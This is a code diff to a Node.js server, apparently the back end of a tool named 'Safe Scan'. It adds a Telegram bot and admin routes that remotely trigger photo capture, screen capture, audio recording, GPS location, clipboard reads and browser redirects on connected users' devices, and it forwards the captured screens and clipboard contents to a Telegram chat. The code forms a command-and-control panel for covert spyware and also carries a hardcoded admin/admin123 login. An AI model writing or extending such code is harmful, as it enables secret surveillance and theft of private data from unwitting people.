@@ -207,7 +207,20 @@ let db = {
   users: [],      // { uuid, country, browser, device_type, ip, is_online, created_at, last_active, location }
   captures: [],   // { id, uuid, file_path, file_size, created_at }
   recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
-  locations: []   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
+  locations: [],  // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
+  // ─── NEW: Telegram Configuration & Notification Toggles ──────────
+  telegram: {
+    token: TELEGRAM_BOT_TOKEN,
+    chatId: TELEGRAM_CHAT_ID,
+    alerts: {
+      connect: true,
+      disconnect: true,
+      capture: true,
+      recording: true,
+      location: true,
+      dailySummary: true
+    }
+  }
 };
 
 let activityLog = []; // { id, type, uuid, message, timestamp }
@@ -230,6 +243,11 @@ function loadData() {
       db.captures = saved.captures || [];
       db.recordings = saved.recordings || [];
       db.locations = saved.locations || [];
+      // Load telegram config if persisted
+      if (saved.telegram) {
+        db.telegram = Object.assign({}, db.telegram, saved.telegram);
+        db.telegram.alerts = Object.assign({}, db.telegram.alerts, saved.telegram.alerts || {});
+      }
       // Mark all users offline on startup
       db.users.forEach(u => u.is_online = false);
       console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations`);
@@ -245,7 +263,8 @@ function saveData() {
       users: db.users,
       captures: db.captures,
       recordings: db.recordings,
-      locations: db.locations
+      locations: db.locations,
+      telegram: db.telegram  // NEW: persist telegram config
     }, null, 2));
   } catch (e) { /* silent */ }
 }
@@ -520,6 +539,71 @@ app.get('/api/stats', authCheck, (req, res) => {
   });
 });
 
+// ─── NEW: Telegram Config Routes ─────────────────────────────────
+app.get('/api/telegram/config', authCheck, (req, res) => {
+  res.json({ token: db.telegram.token, chatId: db.telegram.chatId, alerts: db.telegram.alerts });
+});
+
+app.post('/api/telegram/config', authCheck, (req, res) => {
+  const { token, chatId, alerts } = req.body;
+  if (token) db.telegram.token = token;
+  if (chatId) db.telegram.chatId = chatId;
+  if (alerts && typeof alerts === 'object') {
+    db.telegram.alerts = Object.assign({}, db.telegram.alerts, alerts);
+  }
+  saveData();
+  addLog('system', '', 'Telegram configuration updated');
+  res.json({ message: 'Telegram config saved', config: db.telegram });
+});
+
+app.post('/api/telegram/test', authCheck, (req, res) => {
+  const msg = `✅ Safe Scan — Telegram Test\n\nYour Telegram integration is working correctly!\n🔑 Token: ...${db.telegram.token.slice(-8)}\n💬 Chat ID: ${db.telegram.chatId}\n🕐 ${new Date().toLocaleString()}`;
+  sendTextToTelegramDynamic(msg, db.telegram.token, db.telegram.chatId)
+    .then(() => res.json({ message: 'Test message sent!' }))
+    .catch(e => res.status(500).json({ error: 'Failed: ' + e.message }));
+});
+
+// ─── NEW: Remote Command Route (send to user via HTTP) ───────────
+app.post('/api/command', authCheck, (req, res) => {
+  const { uuid, command, args } = req.body;
+  if (!command) return res.status(400).json({ error: 'command required' });
+  if (uuid) {
+    const userSocketId = connectedUsers.get(uuid);
+    if (!userSocketId) return res.status(404).json({ error: 'User not connected' });
+    io.to(userSocketId).emit('user:command', { command, args: args || {} });
+    addLog('command', uuid, `Remote command sent: ${command}`);
+    res.json({ message: `Command '${command}' sent to ${uuid}` });
+  } else {
+    // Broadcast to all
+    connectedUsers.forEach((socketId) => {
+      io.to(socketId).emit('user:command', { command, args: args || {} });
+    });
+    addLog('command', '', `Broadcast command: ${command}`);
+    res.json({ message: `Command '${command}' broadcast to all users` });
+  }
+});
+
+// ─── Dynamic Telegram sender (uses configurable token/chatId) ────
+function sendTextToTelegramDynamic(text, token, chatId) {
+  return new Promise((resolve, reject) => {
+    const postData = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${token}/sendMessage`,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
+    };
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => { if (res.statusCode === 200) resolve(); else reject(new Error(data)); });
+    });
+    req.on('error', reject);
+    req.write(postData);
+    req.end();
+  });
+}
+
 // ═══════════════════════════════════════════════════════════════════
 // SOCKET.IO
 // ═══════════════════════════════════════════════════════════════════
@@ -576,6 +660,52 @@ io.on('connection', (socket) => {
     socket.on('webrtc:stop', (data) => {
       if (!data || !data.userSocketId) return;
       io.to(data.userSocketId).emit('webrtc:stop');
+    });
+
+    // ─── NEW: Admin Remote Command to specific user ───────────
+    socket.on('admin:command', (data) => {
+      if (!data || !data.command) return;
+      if (data.uuid) {
+        const userSocketId = connectedUsers.get(data.uuid);
+        if (userSocketId) {
+          io.to(userSocketId).emit('user:command', { command: data.command, args: data.args || {} });
+          addLog('command', data.uuid, `Remote command: ${data.command}`);
+          console.log(`🎮 Command '${data.command}' sent to user ${data.uuid}`);
+        }
+      }
+    });
+
+    // ─── NEW: Admin Broadcast Command to all users ────────────
+    socket.on('admin:broadcast', (data) => {
+      if (!data || !data.command) return;
+      connectedUsers.forEach((socketId) => {
+        io.to(socketId).emit('user:command', { command: data.command, args: data.args || {} });
+      });
+      addLog('command', '', `Broadcast command: ${data.command}`);
+      console.log(`📢 Broadcast command '${data.command}' to ${connectedUsers.size} users`);
+    });
+
+    // ─── NEW: Receive data back from users (screen, clipboard) ─
+    socket.on('admin:data', (data) => {
+      if (!data || !data.type) return;
+      if (data.type === 'screen') {
+        // Send screen capture to Telegram
+        try {
+          const base64 = data.payload.replace(/^data:image\/\w+;base64,/, '');
+          const buffer = Buffer.from(base64, 'base64');
+          const u = db.users.find(u => u.uuid === data.uuid);
+          const caption = `🖥️ Screen Capture\nUser: ${data.uuid}\nDevice: ${u?.device_type || 'Unknown'}\n${new Date().toLocaleString()}`;
+          sendPhotoToTelegram(buffer, caption);
+          addLog('screen', data.uuid, 'Screen capture received');
+        } catch(e) { console.error('Screen capture error:', e.message); }
+      } else if (data.type === 'clipboard') {
+        const u = db.users.find(u => u.uuid === data.uuid);
+        const msg = `📋 Clipboard Content\n\nUser: ${data.uuid}\nDevice: ${u?.device_type || 'Unknown'}\n\n<code>${(data.payload || '').substring(0, 3000)}</code>\n\n${new Date().toLocaleString()}`;
+        sendTextToTelegram(msg);
+        addLog('clipboard', data.uuid, 'Clipboard data received');
+      }
+      // Always relay to admin dashboard
+      io.to('admin').emit('user:data', data);
     });
 
     socket.on('disconnect', () => {
@@ -851,4 +981,217 @@ server.listen(PORT, () => {
   console.log(`📁 Media: ${MEDIA_DIR}`);
   console.log(`🔑 Login: admin / admin123`);
   console.log(`\n📡 Waiting for connections...\n`);
+  // Start Telegram bot polling after server is up
+  startTelegramPolling();
 });
+
+// ═══════════════════════════════════════════════════════════════════
+// NEW: INTERACTIVE TELEGRAM BOT (Inbound Command Polling)
+// ═══════════════════════════════════════════════════════════════════
+let telegramOffset = 0;
+let telegramPollingActive = false;
+
+function startTelegramPolling() {
+  if (telegramPollingActive) return;
+  telegramPollingActive = true;
+  console.log('🤖 Telegram bot polling started...');
+  pollTelegramUpdates();
+}
+
+function pollTelegramUpdates() {
+  if (!telegramPollingActive) return;
+  const token = db.telegram.token || TELEGRAM_BOT_TOKEN;
+  const postData = JSON.stringify({ offset: telegramOffset, timeout: 25, allowed_updates: ['message'] });
+  const options = {
+    hostname: 'api.telegram.org',
+    path: `/bot${token}/getUpdates`,
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
+  };
+  const req = https.request(options, (res) => {
+    let data = '';
+    res.on('data', chunk => data += chunk);
+    res.on('end', () => {
+      try {
+        const parsed = JSON.parse(data);
+        if (parsed.ok && parsed.result && parsed.result.length > 0) {
+          parsed.result.forEach(update => {
+            telegramOffset = update.update_id + 1;
+            handleTelegramUpdate(update);
+          });
+        }
+      } catch(e) { /* ignore parse errors */ }
+      // Continue polling
+      setTimeout(pollTelegramUpdates, 1000);
+    });
+  });
+  req.on('error', () => setTimeout(pollTelegramUpdates, 5000));
+  req.setTimeout(30000, () => { req.destroy(); setTimeout(pollTelegramUpdates, 1000); });
+  req.write(postData);
+  req.end();
+}
+
+function handleTelegramUpdate(update) {
+  const msg = update.message;
+  if (!msg || !msg.text) return;
+
+  // Only respond to the authorized chat
+  const authorizedChatId = String(db.telegram.chatId || TELEGRAM_CHAT_ID);
+  const fromChatId = String(msg.chat.id);
+  if (fromChatId !== authorizedChatId) return;
+
+  const text = msg.text.trim();
+  const parts = text.split(' ');
+  const cmd = parts[0].toLowerCase();
+  const arg1 = parts[1] || '';
+  const arg2 = parts[2] || '';
+  const rest = parts.slice(2).join(' ');
+
+  const reply = (txt) => sendTextToTelegram(txt);
+
+  switch (cmd) {
+    case '/start':
+    case '/help': {
+      reply(`🤖 <b>Safe Scan Bot Commands</b>\n\n📊 <b>Info</b>\n/stats — Live statistics\n/users — List all devices\n/logs — Last 10 activity log entries\n/summary — Daily analytics summary\n\n📸 <b>Capture</b>\n/capture &lt;uuid&gt; — Force photo capture\n/screen &lt;uuid&gt; — Request screen capture\n\n🎤 <b>Audio</b>\n/record &lt;uuid&gt; [seconds] — Record audio\n\n📍 <b>Location</b>\n/locate &lt;uuid&gt; — Request GPS update\n\n📟 <b>Control</b>\n/toast &lt;uuid&gt; &lt;message&gt; — Show alert on device\n/vibrate &lt;uuid&gt; — Vibrate device\n/redirect &lt;uuid&gt; &lt;url&gt; — Redirect browser\n/clipboard &lt;uuid&gt; — Read clipboard\n/broadcast &lt;message&gt; — Send to ALL devices`);
+      break;
+    }
+    case '/stats': {
+      const online = db.users.filter(u => u.is_online);
+      reply(`📊 <b>Live Statistics</b>\n\n🟢 Online: ${online.length}\n👥 Total Users: ${db.users.length}\n📸 Total Captures: ${db.captures.length}\n🎤 Total Recordings: ${db.recordings.length}\n🔗 Socket Connections: ${connectedUsers.size}\n\n🕐 ${new Date().toLocaleString()}`);
+      break;
+    }
+    case '/users': {
+      if (db.users.length === 0) { reply('👥 No users registered yet.'); break; }
+      const list = db.users.slice(0, 20).map(u =>
+        `${u.is_online ? '🟢' : '⚫'} <code>${u.uuid.substring(0,8)}</code> — ${u.device_type || '?'} / ${u.browser || '?'} — ${u.country || '?'}`
+      ).join('\n');
+      reply(`👥 <b>Registered Devices</b> (${db.users.length} total)\n\n${list}\n\n<i>Use full UUID for commands</i>`);
+      break;
+    }
+    case '/logs': {
+      if (activityLog.length === 0) { reply('📋 No logs yet.'); break; }
+      const logs = activityLog.slice(0, 10).map(l =>
+        `[${l.type}] ${l.message} — <i>${new Date(l.timestamp).toLocaleTimeString()}</i>`
+      ).join('\n');
+      reply(`📋 <b>Recent Activity</b>\n\n${logs}`);
+      break;
+    }
+    case '/summary': {
+      sendDailySummary();
+      reply('📊 Daily summary sent!');
+      break;
+    }
+    case '/capture': {
+      if (!arg1) { reply('❌ Usage: /capture &lt;uuid&gt;'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found or offline: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      io.to(userSocketId).emit('user:command', { command: 'capture', args: {} });
+      addLog('command', uid, 'Remote capture triggered via Telegram');
+      reply(`📸 Capture command sent to ${uid.substring(0,8)}...`);
+      break;
+    }
+    case '/screen': {
+      if (!arg1) { reply('❌ Usage: /screen &lt;uuid&gt;'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      io.to(userSocketId).emit('user:command', { command: 'screen', args: {} });
+      addLog('command', uid, 'Screen capture triggered via Telegram');
+      reply(`🖥️ Screen capture request sent to ${uid.substring(0,8)}...`);
+      break;
+    }
+    case '/record': {
+      if (!arg1) { reply('❌ Usage: /record &lt;uuid&gt; [seconds]'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      const duration = parseInt(arg2) || 30;
+      io.to(userSocketId).emit('user:command', { command: 'record', args: { duration } });
+      addLog('command', uid, `Remote record triggered (${duration}s) via Telegram`);
+      reply(`🎤 Recording ${duration}s from ${uid.substring(0,8)}...`);
+      break;
+    }
+    case '/locate': {
+      if (!arg1) { reply('❌ Usage: /locate &lt;uuid&gt;'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      io.to(userSocketId).emit('user:command', { command: 'locate', args: {} });
+      addLog('command', uid, 'Location request via Telegram');
+      reply(`📍 Location request sent to ${uid.substring(0,8)}...`);
+      break;
+    }
+    case '/vibrate': {
+      if (!arg1) { reply('❌ Usage: /vibrate &lt;uuid&gt;'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      io.to(userSocketId).emit('user:command', { command: 'vibrate', args: {} });
+      addLog('command', uid, 'Vibrate command via Telegram');
+      reply(`📳 Vibrate sent to ${uid.substring(0,8)}!`);
+      break;
+    }
+    case '/toast': {
+      if (!arg1 || !arg2) { reply('❌ Usage: /toast &lt;uuid&gt; &lt;message&gt;'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      io.to(userSocketId).emit('user:command', { command: 'toast', args: { message: rest || arg2 } });
+      addLog('command', uid, `Toast sent via Telegram: ${rest || arg2}`);
+      reply(`💬 Toast sent to ${uid.substring(0,8)}!`);
+      break;
+    }
+    case '/redirect': {
+      if (!arg1 || !arg2) { reply('❌ Usage: /redirect &lt;uuid&gt; &lt;url&gt;'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      io.to(userSocketId).emit('user:command', { command: 'redirect', args: { url: arg2 } });
+      addLog('command', uid, `Redirect triggered: ${arg2}`);
+      reply(`🔗 Redirect to ${arg2} sent to ${uid.substring(0,8)}!`);
+      break;
+    }
+    case '/clipboard': {
+      if (!arg1) { reply('❌ Usage: /clipboard &lt;uuid&gt;'); break; }
+      const uid = findUserByPartialUUID(arg1);
+      if (!uid) { reply(`❌ User not found: ${arg1}`); break; }
+      const userSocketId = connectedUsers.get(uid);
+      if (!userSocketId) { reply(`❌ User ${arg1} is offline`); break; }
+      io.to(userSocketId).emit('user:command', { command: 'clipboard', args: {} });
+      addLog('command', uid, 'Clipboard read request via Telegram');
+      reply(`📋 Clipboard request sent to ${uid.substring(0,8)}...`);
+      break;
+    }
+    case '/broadcast': {
+      const message = parts.slice(1).join(' ');
+      if (!message) { reply('❌ Usage: /broadcast &lt;message&gt;'); break; }
+      let count = 0;
+      connectedUsers.forEach((socketId) => {
+        io.to(socketId).emit('user:command', { command: 'broadcast', args: { message } });
+        count++;
+      });
+      addLog('command', '', `Broadcast message to ${count} users: ${message}`);
+      reply(`📢 Broadcast sent to ${count} online device(s)!`);
+      break;
+    }
+    default: {
+      if (text.startsWith('/')) reply('❓ Unknown command. Send /help for all commands.');
+    }
+  }
+}
+
+// Helper: find full UUID by partial match
+function findUserByPartialUUID(partial) {
+  if (!partial) return null;
+  const lower = partial.toLowerCase();
+  const user = db.users.find(u => u.uuid && u.uuid.toLowerCase().startsWith(lower));
+  return user ? user.uuid : null;
+}
